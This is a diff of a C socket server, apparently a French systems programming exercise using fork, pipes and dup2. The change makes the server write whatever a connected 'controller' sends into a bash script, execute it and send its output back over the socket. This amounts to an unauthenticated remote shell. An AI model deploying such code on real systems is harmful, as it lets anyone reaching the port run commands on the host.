@@ -1,5 +1,6 @@
 #include <string.h>
 #include <fcntl.h>
+#include <unistd.h>
 
 #include "utils_v2.h"
 
@@ -9,13 +10,15 @@
 #define TAILLE 255
 #define BASH "programme_inoffensif.sh"
 
-void child (void *argv) {
-  int *pipefd = argv;
+void child (void *pipe, void *socket) {
+  int *pipefd = pipe;
+  int *socketfd = socket;
+
+  // printf("%ls", socketfd);
 
   sclose(pipefd[1]);
 
-  int fd = open(BASH, O_WRONLY | O_TRUNC | O_CREAT, 0700);
-  checkNeg(fd, "Error opening file");
+  int fd = sopen(BASH, O_WRONLY | O_TRUNC | O_CREAT, 0700);
 
   char* shebang = "#!/bin/bash\n";
   swrite(fd, shebang, strlen(shebang));
@@ -24,6 +27,14 @@ void child (void *argv) {
   int nbCharRd = sread(pipefd[0], bufferPipeRd, TAILLE);
 
   swrite(fd, bufferPipeRd, nbCharRd);
+
+  sclose(fd);
+
+  dup2(*socketfd, STDOUT_FILENO);
+
+  sexecl("./" BASH, BASH, NULL);
+
+  sclose(pipefd[0]);
 }
 
 int main(int argc, char *arg[]) {
@@ -32,25 +43,22 @@ int main(int argc, char *arg[]) {
   sbind(PORT, sockfd);
   slisten(sockfd, BACKLOG);
   printf("Le serveur tourne sur le port %d\n", PORT);
-  
-  // accept client connection
+
+  // accept controller connection
   int newsockfd = saccept(sockfd);
-  
-  // read message from client
+
+  // read message from controller
   char bufRd[TAILLE];
   int nbCharRd = sread(newsockfd, bufRd, TAILLE);
   printf("Valeur reçue : %s\n", bufRd);
-  
+
   int pipefd[2];
   spipe(pipefd);
-
-  pid_t childId = fork_and_run1(child, pipefd);
-
-  printf("%d\n", childId);
-  printf("parent\n");
+  fork_and_run2(child, pipefd, &newsockfd);
 
   sclose(pipefd[0]);
 
+  // write message in pipe
   while (nbCharRd > 0) {
     swrite(pipefd[1], bufRd, nbCharRd);
     nbCharRd = sread(0, bufRd, TAILLE);
